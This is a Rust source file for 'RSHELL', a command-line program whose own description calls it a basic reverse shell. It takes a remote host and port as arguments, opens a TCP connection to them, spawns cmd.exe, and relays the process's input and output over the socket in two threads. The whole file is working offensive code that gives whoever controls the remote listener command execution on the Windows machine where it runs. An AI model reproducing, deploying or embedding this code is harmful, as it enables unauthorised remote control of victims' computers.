extern crate clap;

use std::process::{Command, Stdio};
use std::net::TcpStream;
use std::io::{Read, Write};
use std::{thread, time};
use std::sync::{Arc,Mutex};
use clap::{App, Arg};

fn main() 
{
    let matches = App::new("RSHELL")
                    .version("0.666")
                    .author("Hrafnskogr <hrafnskogr@pm.me>")
                    .about("Basic reverse shell")
                    .arg(
                        Arg::with_name("host")
                        .help("Remote Host")
                        .index(1)
                        .requires("port")
                        .required(true)
                    )
                    .arg(
                        Arg::with_name("port")
                        .help("Remote Port")
                        .index(2)
                        .required(true)
                    )
                    .get_matches();

    revshell(matches.value_of("host").unwrap(), 
                matches.value_of("port").unwrap());
}

fn revshell(host: &str, port: &str)
{
    match TcpStream::connect(format!("{}:{}", host, port))
    {
        Ok(stream) => {
            println!("Connected, listening...");

            // We are connected, spawn a process
            let proc = Command::new("cmd.exe")
                                .stdout(Stdio::piped())
                                .stdin(Stdio::piped())
                                .stderr(Stdio::piped())
                                .spawn()
                                .expect("Failed to spawn cmd.exe");

            // Thread mutexes init
            let thd_proc_in = Arc::new(Mutex::new(proc.stdin));
            let thd_proc_out = Arc::new(Mutex::new(proc.stdout));
            let thd_stream = Arc::new(Mutex::new(stream));

            let stream_to_proc = thread::spawn( 
                {
                    let c_stream = Arc::clone(&thd_stream);
                    let c_proc_in = Arc::clone(&thd_proc_in);
                    move || {
                        loop
                        {
                            thread::sleep(time::Duration::from_millis(10));

                            let mut buf = [0u8;128];
                            let mut l_stream = match c_stream.try_lock()
                            {
                                Ok(lock) => lock,
                                Err(_) => continue,
                            };

                            match l_stream.read(&mut buf)
                            {
                                Ok(n) => {
                                    let mut l_proc_in = c_proc_in.lock().unwrap();
                                    l_proc_in.as_mut().unwrap()
                                                      .write_all(&buf[0..n]).unwrap();
                                    l_proc_in.as_mut().unwrap().flush().unwrap();
                                    drop(l_proc_in);
                                },
                                Err(e) => println!("Failed to read data from stream:\n{}", e),
                            };
                            drop(l_stream);
                        }
                    }
                });

            let proc_to_stream = thread::spawn( 
                {
                    let c_stream = Arc::clone(&thd_stream);
                    let c_proc_out = Arc::clone(&thd_proc_out);
                    move || {
                        loop
                        {
                            let mut buf = [0u8;128];
                            let mut l_proc_out = c_proc_out.lock().unwrap();
                            match l_proc_out.as_mut().unwrap().read(&mut buf)
                            {
                                Ok(n) => 
                                {
                                    let mut l_stream = c_stream.lock().unwrap();
                                    l_stream.write_all(&buf[0..n]).unwrap();
                                    drop(l_stream)
                                },
                                Err(e) => println!("Failed to read data from proc:\n{}", e),
                            };
                            drop(l_proc_out);
                        }
                    }
                });

            stream_to_proc.join().unwrap();
            proc_to_stream.join().unwrap();
        },
        Err(e) => println!("Failed to connect:\n{}", e),
    }
}

